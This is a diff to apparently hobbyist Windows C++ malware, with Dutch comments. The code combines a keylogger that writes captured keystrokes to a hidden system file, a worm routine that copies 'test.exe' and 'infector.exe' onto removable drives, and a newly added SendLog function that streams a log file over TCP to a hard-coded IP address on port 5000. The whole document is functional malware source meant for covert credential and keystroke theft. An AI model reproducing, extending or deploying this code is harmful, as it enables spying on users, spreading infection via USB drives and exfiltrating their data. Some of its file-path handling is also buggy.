@@ -1,4 +1,5 @@
 #define _WIN32_WINNT 0x0600
+#include <WinSock2.h>
 #include <shlobj.h>
 #include <Shlwapi.h>
 #include <string>
@@ -8,36 +9,64 @@
 #include <string.h>
 #include <fstream>
 #include <map>
-#include <WinSock2.h>
 
 using namespace std;
+
+const char *drive[]={ 
+    "a:", "b:", "c:", "d:", "e:", "f:", "g:", "h:", "i:", "j:", "k:", "l:",
+    "m:", "n:", "o:", "p:", "q:", "r:", "s:", "t:", "u:", "v:", "w:", "x:",
+    "y:", "z:", 0
+};
+
+const char payload[MAX_PATH]="\\test.exe";
+const char infector[MAX_PATH]="\\infector.exe";
+
 
 char* GetUser() {
     char* user = getenv("USERNAME");
     return user;
 }
 
-void LOG(string input) {
+char* CreateLog() {
     string username = GetUser();
     string filename = username + ".txt";
-    //fstream LogFile(filename, fstream::app);
+    string filename2 = "\\" + username + ".txt";
+    
 
     char saveLocation[MAX_PATH] = {0};
-
     SHGetFolderPath(NULL, CSIDL_PERSONAL, NULL, SHGFP_TYPE_CURRENT, saveLocation);
 
     string filePath = string(saveLocation) + "\\" + filename;
     SetFileAttributes(filePath.c_str(), FILE_ATTRIBUTE_HIDDEN);
-
     fstream LogFile(filePath , fstream::app);
+    SetFileAttributes(filePath.c_str(),FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
+    
+    //strcat(saveLocation, username.c_str());
+    //strcat(saveLocation, ".txt");
+    
+    char tempPath[MAX_PATH];
+    strcpy(tempPath, filePath.c_str());
+    strcat(tempPath, filename2.c_str());
+    std::cout << "path: " << tempPath << std::endl;
+    return tempPath;
+}
+
+
+void LOG(string input, char* logFile) {
+    string filePath = string(logFile);
+    SetFileAttributes(filePath.c_str(), FILE_ATTRIBUTE_HIDDEN);
+    
+    fstream LogFile(filePath , fstream::app);
+    //std::cout << "Halllo Ik copy nu hier!: " << logFile << std::endl;
     if (LogFile.is_open()) {
         LogFile << input;
         LogFile.close();
     }
+    return;
 } 
 
 // voegt speciale toetsen toe aan een map
-bool SpecialKeys(int S_Key) {
+bool SpecialKeys(int S_Key, char* logFile) {
     static map<int, string> specialKeys = {
         {VK_SPACE, " "},
         {VK_RETURN, "\n"},
@@ -73,7 +102,7 @@ bool SpecialKeys(int S_Key) {
     // als de toets in de map zit dan logt hij de toets
     if (specialKeys.find(S_Key) != specialKeys.end()) {
         cout << specialKeys[S_Key];
-        LOG(specialKeys[S_Key]);
+        LOG(specialKeys[S_Key], logFile);
         return true;
     }
     return false;
@@ -87,12 +116,12 @@ bool KillSwitch() {
 }
 
 
-int KeyLogger()
+int KeyLogger(char* logFile)
 {
     // voor elke toets wordt er gekeken of hij is ingedrukt
     for (int KEY = 1; KEY <= 255; KEY++) {
         if (GetAsyncKeyState(KEY) == -32767) {
-            if (!SpecialKeys(KEY)) {
+            if (!SpecialKeys(KEY, logFile)) {
                 char logged_key = static_cast<char>(KEY);
                 // numpad toetsen worden omgezet naar normale toetsen
                 if (KEY >= VK_NUMPAD0 && KEY <= VK_NUMPAD9) {
@@ -102,7 +131,7 @@ int KeyLogger()
                     logged_key = (GetKeyState(VK_SHIFT) < 0) ^ (GetKeyState(VK_CAPITAL) & 1) ? toupper(logged_key) : tolower(logged_key);
                 }
                 // logt de toets
-                LOG(string(1, logged_key));
+                LOG(string(1, logged_key), logFile);
             }
         }
     }
@@ -110,19 +139,14 @@ int KeyLogger()
     return 0;
 }
 
-const char *drive[]={ 
-    "a:", "b:", "c:", "d:", "e:", "f:", "g:", "h:", "i:", "j:", "k:", "l:",
-    "m:", "n:", "o:", "p:", "q:", "r:", "s:", "t:", "u:", "v:", "w:", "x:",
-    "y:", "z:", 0
-};
 
-const char payload[MAX_PATH]="\\test.exe";
-const char infector[MAX_PATH]="\\infector.exe";
 
 int FindDrv(const char *drive)
 {
     char dirX[MAX_PATH];
+    char dirX2[MAX_PATH];
     char path[MAX_PATH];
+    char path2[MAX_PATH];
     //char autorun[MAX_PATH]="AutoRun.inf";
     //std::ofstream CreAut;
     
@@ -135,6 +159,8 @@ int FindDrv(const char *drive)
     std::string buff = tempString.substr(0, tempString.find_last_of("\\"));
     strcpy(path, buff.c_str());
     strcat(path, payload);
+    strcpy(path2, buff.c_str());
+    strcat(path2, infector);
 
     //CreAut.open(dirX,std::ios_base::out);
     //CreAut<<"[AutoRun]" << std::endl;
@@ -151,13 +177,12 @@ int FindDrv(const char *drive)
     if(type == DRIVE_REMOVABLE)
     {
         strcpy(dirX, drive);
-        strcat(dirX, "\\");
-        strcat(dirX, "test.exe");
+        strcat(dirX, payload);
+        strcpy(dirX2, drive);
+        strcat(dirX2, infector);
 
-        std::cout << path << std::endl;
-        std::cout << dirX << std::endl;
-
-        CopyFile(path,dirX,TRUE); 
+        CopyFile(path,dirX,TRUE);
+        CopyFile(path2,dirX2,TRUE); 
         SetFileAttributes(path,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
         //strcpy(dirX, drive);
         //strcat(dirX, "\\" );
@@ -180,22 +205,107 @@ int Worm() {
     return 0;
 }
 
+int SendLog() {
 
+    // Initialize Winsock
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        cerr << "Error: Failed to initialize Winsock" << endl;
+        return -1;
+    }
+    cerr << "Winsock initialized" << endl;
+
+    // Set up the server address
+    struct sockaddr_in serverAddr;
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(5000);
+    serverAddr.sin_addr.s_addr = inet_addr("172.27.64.1"); //IP van receiving machine
+
+    // Create a socket and connect to the server
+    SOCKET clientSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (clientSock == INVALID_SOCKET) {
+        cerr << "Error: Failed to create socket" << endl;
+        WSACleanup();
+        return -1;
+    }
+    cerr << "Socket created" << endl;
+    if (connect(clientSock, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
+        cerr << "Error: Failed to connect to server" << endl;
+        closesocket(clientSock);
+        WSACleanup();
+        return -1;
+    }
+    cerr << "Connected to server" << endl;
+
+    // Open the file for reading
+    ifstream file("myfile.txt", ios::binary); //file die je door wilt sturen
+    if (!file.is_open()) {
+        cerr << "Error: Failed to open file for reading" << endl;
+        closesocket(clientSock);
+        WSACleanup();
+        return -1;
+    }
+    cerr << "Open file for reading" << endl;
+
+    // Send the file data over the socket
+    const int bufferSize = 1024;
+    char buffer[bufferSize];
+    int bytesRead;
+    while (file.read(buffer, bufferSize)) {
+        bytesRead = send(clientSock, buffer, file.gcount(), 0);
+        if (bytesRead == SOCKET_ERROR) {
+            cerr << "Error: Failed to send data over socket" << endl;
+            file.close();
+            closesocket(clientSock);
+            WSACleanup();
+            return -1;
+        }
+        cerr << "Data sent over socket" << endl;
+    }
+    bytesRead = send(clientSock, buffer, file.gcount(), 0);  // send any remaining data
+    if (bytesRead == SOCKET_ERROR) {
+        cerr << "Error: Failed to send data over socket" << endl;
+        file.close();
+        closesocket(clientSock);
+        WSACleanup();
+        return -1;
+    }
+    cerr << "Data Sent over socket" << endl;
+
+    // Close the file and the socket
+    file.close();
+    closesocket(clientSock);
+    WSACleanup();
+
+    return 0;
+}
 
 int main()
 {   
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    //ShowWindow(GetConsoleWindow(), SW_HIDE);
     // zolang de keylogger niet wordt gestopt blijft hij lopen
+    auto last_executed_time = std::chrono::steady_clock::now();
+
+    //maak de log file aan
+    char* logFiledir = CreateLog();
+
+    std::cout << "file path: " << logFiledir << std::endl;
+
     while (true) {
+        auto current_time = std::chrono::steady_clock::now();
+        auto elapsed_time = std::chrono::duration_cast<std::chrono::minutes>(current_time - last_executed_time).count();
+        if (elapsed_time >= 1) {
+            //SendLog(); // voert de sendlog uit
+            last_executed_time = current_time;                        
+        }
         Sleep(10);
         // als de killswitch is geactiveerd dan logt ##KILLED##
         if (KillSwitch()) {
-            LOG("##KILLED##");
+            LOG("##KILLED##", logFiledir);
             break;
         }
         Worm(); // voert de worm uit 
-        KeyLogger(); // voert de keylogger uit
-    }
-    
+        KeyLogger(logFiledir); // voert de keylogger uit
+    }   
     return 0;
 }
